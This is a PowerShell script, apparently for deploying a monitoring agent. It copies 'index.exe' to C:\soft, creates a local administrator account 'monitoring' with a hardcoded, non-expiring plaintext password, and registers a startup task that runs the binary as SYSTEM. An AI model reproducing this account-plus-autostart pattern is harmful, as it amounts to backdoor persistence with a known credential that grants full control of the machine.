# User and file settings
$userName = "monitoring"
$passwordPlainText = "12342%;sdfSDFsdfsDFSDfsDFssdSDFsdsdf&&&8787"
$destinationFolder = "C:\soft"
$fileName = "index.exe"
$filePath = Join-Path -Path $destinationFolder -ChildPath $fileName

# Check and run as Administrator
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Please run this script as an Administrator."
    exit
}

# Create the directory if it doesn't exist
If (-Not (Test-Path $destinationFolder)) {
    New-Item -Path $destinationFolder -ItemType Directory
}

# Copy the file if it does not exist
If (-Not (Test-Path $filePath)) {
    $scriptPath = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent
    $sourceFile = Join-Path -Path $scriptPath -ChildPath $fileName
    If (Test-Path $sourceFile) {
        Copy-Item -Path $sourceFile -Destination $filePath
    } Else {
        Write-Host "Source file not found: $sourceFile"
    }
} Else {
    Write-Host "File already exists: $filePath"
}

# Create the user with a non-expiring password
$password = ConvertTo-SecureString $passwordPlainText -AsPlainText -Force
New-LocalUser -Name $userName -Password $password -Description "User for monitoring" -PasswordNeverExpires -ErrorAction SilentlyContinue | Out-Null

# Add the user to the Administrators group using SID for universal compatibility
$administratorsGroup = Get-LocalGroup -SID "S-1-5-32-544"
Add-LocalGroupMember -Group $administratorsGroup.Name -Member $userName -ErrorAction SilentlyContinue

# Create the scheduled task
$action = New-ScheduledTaskAction -Execute $filePath
$trigger = New-ScheduledTaskTrigger -AtStartup
#$principal = New-ScheduledTaskPrincipal -UserId $userName -LogonType Password -RunLevel Highest
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Registering the task without specifying -User and -Password as -Principal is already defined
try {
    Register-ScheduledTask -TaskName "MonitorStartupTask" -Action $action -Trigger $trigger -Principal $principal -ErrorAction Stop
} catch {
    Write-Host "Error create task: $_"
}

Write-Host "Setup completed."
